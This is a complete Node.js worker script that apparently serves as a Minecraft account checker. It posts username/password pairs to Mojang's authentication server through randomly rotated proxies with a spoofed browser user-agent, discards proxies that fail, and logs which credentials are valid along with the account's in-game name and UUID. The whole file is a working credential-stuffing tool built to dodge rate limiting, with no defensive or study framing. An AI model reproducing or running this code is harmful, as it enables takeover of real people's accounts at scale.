function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}   
function rnum(min, max) {  
  return Math.floor(
    Math.random() * (max - min + 1) + min
  )
}

const {parentPort, workerData,isMainThread } = require("worker_threads");
if(isMainThread)process.exit(9);
let axios = require("axios");
let CancelToken = require("axios").CancelToken;
const HttpsProxyAgent = require("https-proxy-agent");


parentPort.on('message', (message) => {
	if(message.exit){
		process.exit();
	}
	
	var user = message[0],passw=message[1];
	var proxies = workerData;
	
	(async () => {
			
			var proxy, index;
			//request
			do{
				index = rnum(0, proxies.length-1);
				proxy = proxies[index];
				proxy=proxy.split(':');

				//connection timeout
				  var source = CancelToken.source();
				  var timeout = setTimeout(() => { //timeout, bad proxy, remove
					source.cancel();
					//console.log(`number ${index+1}: bad proxy (timeout)`);
					proxies.splice(index, 1);
					timeout = null;
				  }, 7000);
				  

				const httpsAgent = new HttpsProxyAgent({host: proxy[0], port: parseInt(proxy[1])});
				const config = {
					method: "post",
					url: "https://authserver.mojang.com/authenticate",
					headers: {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4521.0 Safari/537.36 Edg/93.0.910.5'},
					httpsAgent: httpsAgent,
					timeout: 7000, //ms, response timeout
					cancelToken: source.token, //token for conneciton timeout
					data:{
						'agent': {
							'name': 'Minecraft',
							'version': 1
						},
						'username': user,
						'password': passw,
						'requestUser': 'true'
					}
				};
				/*
				const httpsAgent = new HttpsProxyAgent({host: proxy[0], port: parseInt(proxy[1])});
				const config = {
					method:"get",
					url: "https://api.my-ip.io/ip",
					//url: "https://api.ipify.org/",
					//url: "https://httpbin.org/ip",
					httpsAgent: httpsAgent
				};*/
				var resp;
				try{
					resp = await axios.request(config);
					clearTimeout(timeout); //request success, cancel connection timeout
					//console.log("resp: ",resp.data);
					
					const respstr = JSON.stringify(resp.data);
					if(respstr.indexOf("Invalid credentials")!= -1){ //invalid credentials is in the response, bad account
						console.log(message + " is not a valid account :(");
						parentPort.postMessage("ready for next");
					}else{ //invalid credentials is not in the response, good account
						
						const uuid = resp.data['availableProfiles'][0]["id"];
						const ign = resp.data['availableProfiles'][0]['name'];
						
						console.log(`${message} is a valid account!, IGN: ${ign} , UUID: ${uuid}`);
						parentPort.postMessage("ready for next");
					}
				}catch(err){
					clearTimeout(timeout); //request unsuccessful but still returned, cancel connection timeout
					if ((err.code === undefined) && (timeout != null)) { //if timeout, will still catch, since when timeouts, we null it, so if it throws an error before it is nulled, it means that it has not timeouted
					  //invalid credentials also returns a 403
					  var respstr, err_message = err.message;
					  try{
						  respstr=JSON.stringify(err.response.data);
					  }catch{
						  respstr="";
					  }
					  
					  if(respstr.indexOf("Invalid credentials")!= -1){ //invalid credentials is in the response, bad account
						  console.log(message + " is not a valid account :(");
						  parentPort.postMessage("ready for next");
					  }else{
						  //console.log(`number ${index+1}: bad proxy, ${err.code}`);
						  //console.log(err_message);
						  proxies.splice(index, 1);
					  }  
					}else if((timeout != null)){//ANY other errors but, hasnt ended b/c of timeout
						//console.log(`number ${index+1}: bad proxy, ${err.code}`);
						proxies.splice(index, 1);
					} 
					
				}
			}while(true)
	})()

});

